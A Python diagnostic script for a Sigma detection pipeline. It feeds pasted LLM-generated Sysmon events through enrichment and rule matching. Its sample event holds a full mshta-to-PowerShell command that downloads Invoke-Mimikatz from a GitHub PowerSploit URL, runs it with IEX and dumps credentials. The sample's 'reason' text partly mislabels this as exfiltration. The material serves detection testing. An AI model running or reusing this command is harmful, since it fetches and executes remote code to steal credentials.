"""
scripts/diagnose_llm_event.py

Paste raw LLM interpretation dicts (from [DEBUG] Raw LLM output) into
RAW_LLM_OUTPUTS below.  The script runs each through the same post-LLM
pipeline the real run uses:

  build_log_event()          — grounding, EID3 enrichment, Protocol
                               normalisation, DestinationPort coercion,
                               Initiated default, min-field validation
      ↓
  model_dump(exclude_none)   — same serialisation path as output_writer
  + Channel injection
      ↓
  DetectionEngine.run()      — pySigma → SQL → sqlite3, all rules in rules/

If procedure_text is left as "" the script constructs a synthetic text from
the field values so grounding passes — this isolates enrichment and detection
without needing the original Atomic procedure.  Set VERBOSE_MISSES = True to
see SQL for every non-firing rule (useful when nothing fires and you want to
understand why).

Usage:
    python scripts/diagnose_llm_event.py
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
# Project root on path
# ---------------------------------------------------------------------------

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

# ---------------------------------------------------------------------------
# ── PASTE YOUR RAW LLM OUTPUTS HERE ────────────────────────────────────────
#
# Each entry is the JSON block printed by [DEBUG] Raw LLM output.
# Fields:
#   interpretation    — the full dict (confidence, reason, event_type,
#                       EventID, fields{...})
#   procedure_text    — paste the original Atomic procedure text if you have
#                       it; leave "" to bypass grounding and trust fields as-is
#   executor_name     — "powershell" | "cmd" | "command_prompt"
#                       drives EID3 Image/ParentImage enrichment
#   elevation_required — bool; sets user to SYSTEM vs domain\user
#   evasion_hints     — dict of attacker field overrides, or None
# ---------------------------------------------------------------------------

RAW_LLM_OUTPUTS = [
    {
        "interpretation":
        {
  "confidence": "high",
  "reason": "Step 3 (Invoke-Expression) represents the primary malicious action — executing code from an ADS stream. Evasion hints override the executor context with mshta.exe as the parent process, indicating process injection/obfuscation. The CommandLine from evasion hints contains explicit credential dumping (Invoke-Mimikatz) and network exfiltration (GitHub URL), making this the most detectable and significant event.",
  "event_type": "process_creation",
  "EventID": 1,
  "fields": {
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'; $wshell=New-Object -ComObject WScript.Shell; $reg='HKCU:\\Software\\Microsoft\\Notepad'; $app='Notepad'; $props=(Get-ItemProperty $reg); [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); @(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{Set-ItemProperty $reg (Item Variable:_).Value[0] (Variable _).Value[1]}; $curpid=$wshell.Exec($app).ProcessID; While(!($title=Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500}; While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500}; $wshell.SendKeys('^o'); Start-Sleep -Milliseconds 500; @($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)}; $res=$Null; While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear(); @('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}; Start-Sleep -Milliseconds 500; $res=([Windows.Forms.Clipboard]::GetText())}; [Windows.Forms.Clipboard]::Clear(); @('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)}; If(Get-Process|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}}; @('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{Set-ItemProperty $reg (Item Variable:_).Value $props.((Variable _).Value)}; IEX($res); invoke-mimikatz -dumpcr\",0)(window.close)\"",
    "ParentImage": "C:\\Windows\\System32\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe"
  }
},

    },
    # ── add more entries here ──
]

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

RULES_DIR = ROOT / "rules"

# Show SQL + miss reason for every non-firing rule.
# Keep False for a clean summary; flip to True when nothing fires.
VERBOSE_MISSES = False

# ---------------------------------------------------------------------------
# Imports (after ROOT is on sys.path)
# ---------------------------------------------------------------------------

from pipeline.emulator.procedure_interpreter import (  # noqa: E402
    build_log_event,
    _ground_fields,          # private — fine for a diagnostic script
)
from pipeline.emulator.log_builder import LogEvent     # noqa: E402
from pipeline.detection.engine import DetectionEngine  # noqa: E402


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _serialize(log_event: LogEvent) -> dict:
    """Mirror output_writer serialisation: exclude_none + Channel default."""
    d = log_event.model_dump(exclude_none=True)
    d.setdefault("Channel", "Microsoft-Windows-Sysmon/Operational")
    return d


def _build_event(entry: dict) -> tuple[LogEvent | None, dict]:
    """
    Run one entry through build_log_event, return (LogEvent|None, stage_info).

    If procedure_text is empty we build a synthetic text from the field values
    so the grounding check passes.  This isolates enrichment + detection from
    grounding — useful when you only have the LLM output, not the source test.
    """
    interp = entry["interpretation"]
    procedure_text = entry.get("procedure_text", "").strip()
    executor_name = entry.get("executor_name")
    elevation_required = entry.get("elevation_required", False)
    evasion_hints = entry.get("evasion_hints")

    stage_info: dict = {}

    if not procedure_text:
        # Synthetic bypass: concatenate all field values so verbatim check
        # succeeds for every field.  Protocol/Initiated/DestinationPort bypass
        # grounding regardless (EID3 implicit passthrough), but this covers
        # EID1 CommandLine/Image fields in other entries too.
        procedure_text = " ".join(
            str(v) for v in interp.get("fields", {}).values()
        )
        stage_info["grounding"] = "BYPASSED — synthetic procedure_text built from field values"
    else:
        raw_fields = interp.get("fields", {})
        grounded = _ground_fields(raw_fields, procedure_text, evasion_hints)
        dropped = set(raw_fields) - set(grounded)
        stage_info["grounding"] = {
            "kept": sorted(grounded.keys()),
            "dropped": sorted(dropped),
        }

    log_event = build_log_event(
        interpretation=interp,
        procedure_text=procedure_text,
        evasion_hints=evasion_hints,
        elevation_required=elevation_required,
        executor_name=executor_name,
    )

    return log_event, stage_info


def _sep(char: str = "─", width: int = 72) -> None:
    print(char * width)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    print()
    _sep("═")
    print("  DIAGNOSTIC: LLM Output → build_log_event → DetectionEngine")
    _sep("═")

    if not RAW_LLM_OUTPUTS:
        print("\nERROR: RAW_LLM_OUTPUTS is empty. Paste your events at the top.")
        sys.exit(1)

    # ── Stage 1: build_log_event ──────────────────────────────────────────
    print()
    _sep()
    print("  STAGE 1 — build_log_event  (grounding · enrichment · validation)")
    _sep()

    serialized_events: list[dict] = []
    entry_labels: list[str] = []

    for i, entry in enumerate(RAW_LLM_OUTPUTS, 1):
        interp = entry["interpretation"]
        label = f"Entry {i}  [{interp.get('event_type', '?')} / EID {interp.get('EventID', '?')}]"
        print(f"\n  {label}")
        print(f"    input fields   : {list(interp.get('fields', {}).keys())}")
        print(f"    executor       : {entry.get('executor_name', 'not set')}")
        print(f"    elevation      : {entry.get('elevation_required', False)}")
        print(f"    evasion_hints  : {entry.get('evasion_hints')}")

        log_event, stage_info = _build_event(entry)

        grounding = stage_info["grounding"]
        if isinstance(grounding, str):
            print(f"    grounding      : {grounding}")
        else:
            print(f"    grounding      : kept={grounding['kept']}")
            if grounding["dropped"]:
                print(f"                     DROPPED={grounding['dropped']}")

        if log_event is None:
            print(
                "    ✗  build_log_event → None  (dropped at grounding, min-field,")
            print("       confidence, or EventID gate — check output above)")
            continue

        serialized = _serialize(log_event)
        serialized_events.append(serialized)
        entry_labels.append(label)

        print(f"    ✓  LogEvent constructed  ({len(serialized)} fields)")
        print("    Serialized:")
        for k, v in serialized.items():
            print(f"      {k:<26} {v!r}")

    if not serialized_events:
        print("\n  All entries dropped by build_log_event — nothing to detect against.")
        sys.exit(0)

    # ── Stage 2: DetectionEngine ──────────────────────────────────────────
    print()
    _sep()
    print(
        f"  STAGE 2 — DetectionEngine  ({len(serialized_events)} event(s) · rules: {RULES_DIR})")
    _sep()
    print()

    if not RULES_DIR.exists():
        print(f"  ERROR: rules directory not found: {RULES_DIR}")
        sys.exit(1)

    engine = DetectionEngine(rules_dir=RULES_DIR, events=serialized_events)
    results = engine.run()

    if not results:
        print("  No rule files found.")
        sys.exit(0)

    fired = [r for r in results if r.fired]
    skipped = [r for r in results if r.skipped]
    missed = [r for r in results if not r.fired and not r.skipped]

    # ── Summary ───────────────────────────────────────────────────────────
    print()
    _sep("═")
    print(
        f"  RESULTS  {len(results)} rules  ·  "
        f"{len(fired)} fired  ·  {len(missed)} miss  ·  {len(skipped)} skipped"
    )
    _sep("═")

    # Fired
    if fired:
        print(f"\n  ✦  FIRED ({len(fired)})\n")
        for r in fired:
            _sep()
            print(f"  {r.rule_title}")
            print(f"  id   : {r.rule_id}")
            print(f"  file : {r.rule_path}")
            print(f"  SQL  : {r.sql_query}")
            print(f"  hits : {len(r.matched_events)} event(s)")
            for j, evt in enumerate(r.matched_events, 1):
                # Only show populated fields — empty strings are schema padding
                populated = {k: v for k, v in evt.items() if v and v != ""}
                print(f"    event {j}:")
                print(
                    "      "
                    + json.dumps(populated, indent=6)
                    .replace("\n", "\n      ")
                )
    else:
        print("\n  ✗  No rules fired.")

    # Skipped
    if skipped:
        print(f"\n  ✗  SKIPPED ({len(skipped)})\n")
        for r in skipped:
            print(f"  [{r.rule_id[:16]}]  {r.rule_title}")
            print(f"    reason : {r.skip_reason}")
            if r.sql_query:
                print(f"    SQL    : {r.sql_query}")

    # Missed
    if missed:
        print(f"\n  ·  MISS ({len(missed)})")
        if VERBOSE_MISSES:
            print()
            for r in missed:
                print(f"  [{r.rule_id[:16]}]  {r.rule_title}")
                if r.sql_query:
                    print(f"    SQL : {r.sql_query}")
        else:
            titles = ", ".join(r.rule_title for r in missed[:5])
            tail = f" … +{len(missed) - 5} more" if len(missed) > 5 else ""
            print(f"    {titles}{tail}")
            print("    (set VERBOSE_MISSES = True to see SQL for each)")

    print()
    _sep("═")
    print()


if __name__ == "__main__":
    main()
